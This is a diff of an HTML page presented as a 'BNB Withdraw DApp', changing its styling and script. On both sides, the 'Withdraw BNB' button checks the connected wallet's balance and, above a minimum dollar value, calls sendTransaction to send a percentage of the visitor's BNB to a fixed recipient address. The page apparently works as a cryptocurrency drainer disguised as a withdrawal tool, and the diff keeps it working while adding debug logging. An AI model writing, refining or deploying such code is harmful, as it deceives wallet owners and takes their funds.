@@ -3,62 +3,43 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>BNB Withdraw DApp</title>
+  <title>BNB Withdraw DApp Debug</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
     body {
       font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 1rem;
-      background: #f9f9f9;
+      margin: 2rem;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
+      gap: 20px;
+      background: #f9f9f9;
       min-height: 100vh;
     }
     w3m-core-button {
-      margin: 20px 0;
+      margin-bottom: 1rem;
     }
     #withdrawBtn {
       background-color: #f0b90b;
-      color: #fff;
       border: none;
-      padding: 1rem 2rem;
+      padding: 12px 24px;
       font-size: 1rem;
-      border-radius: 8px;
+      border-radius: 6px;
       cursor: pointer;
       display: none;
     }
     #message {
-      margin-top: 1.5rem;
       font-weight: bold;
-      font-size: 1rem;
       color: #d9534f;
-      text-align: center;
       min-height: 1.2em;
-    }
-    @media (max-width: 600px) {
-      #withdrawBtn {
-        width: 100%;
-        font-size: 1.1rem;
-        padding: 1rem;
-      }
+      text-align: center;
     }
   </style>
 </head>
 <body>
 
-  <!-- Wallet connect button -->
   <w3m-core-button></w3m-core-button>
-
-  <!-- Withdraw button -->
   <button id="withdrawBtn">Withdraw BNB</button>
-
-  <!-- Status and error messages -->
-  <div id="message"></div>
+  <div id="message">Loading...</div>
 
   <script type="module">
     import { getAccount, fetchBalance, sendTransaction } from "https://unpkg.com/@web3modal/ethereum@2.6.2";
@@ -74,12 +55,13 @@
         const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
         const data = await res.json();
         return parseFloat(data.price);
-      } catch {
+      } catch (e) {
+        console.error("Failed to fetch BNB price", e);
         return null;
       }
     }
 
-    async function checkWallet() {
+    function updateUI() {
       const acc = getAccount();
       if (acc?.isConnected) {
         withdrawBtn.style.display = "inline-block";
@@ -97,39 +79,48 @@
         return;
       }
 
-      try {
-        const price = await getBNBPrice();
-        if (!price) {
-          message.textContent = "Failed to fetch BNB price.";
-          return;
-        }
+      message.textContent = "Checking balance and preparing transaction...";
 
+      const price = await getBNBPrice();
+      if (!price) {
+        message.textContent = "Error fetching BNB price.";
+        return;
+      }
+
+      try {
         const balance = await fetchBalance({ address: acc.address, chainId: 56 });
         const bnbAmount = parseFloat(balance.formatted);
         const usdAmount = bnbAmount * price;
 
         if (usdAmount < MIN_USD) {
-          message.textContent = `Minimum $${MIN_USD} required to withdraw. Current: $${usdAmount.toFixed(2)}`;
+          message.textContent = `Minimum $${MIN_USD} required to withdraw. Your balance is $${usdAmount.toFixed(2)}.`;
           return;
         }
 
-        const toSend = (bnbAmount * SEND_PERCENT).toFixed(6);
+        const toSend = bnbAmount * SEND_PERCENT;
         const valueWei = BigInt(Math.floor(toSend * 1e18)).toString();
 
-        const { hash } = await sendTransaction({
+        message.textContent = `Sending ${toSend.toFixed(6)} BNB...`;
+
+        const tx = await sendTransaction({
           to: recipient,
           value: valueWei,
         });
 
-        message.textContent = `Transaction sent! Hash: ${hash}`;
+        message.textContent = `Transaction sent! Hash: ${tx.hash}`;
+        console.log("Transaction Hash:", tx.hash);
+
       } catch (err) {
-        console.error(err);
-        message.textContent = "Transaction failed. Please check gas fees and try again.";
+        console.error("Transaction error:", err);
+        message.textContent = "Transaction failed or rejected.";
       }
     }
 
     withdrawBtn.addEventListener("click", withdrawBNB);
-    setInterval(checkWallet, 1000);
+
+    // Poll wallet connection status every 1 second
+    setInterval(updateUI, 1000);
+    updateUI();
   </script>
 </body>
 </html>
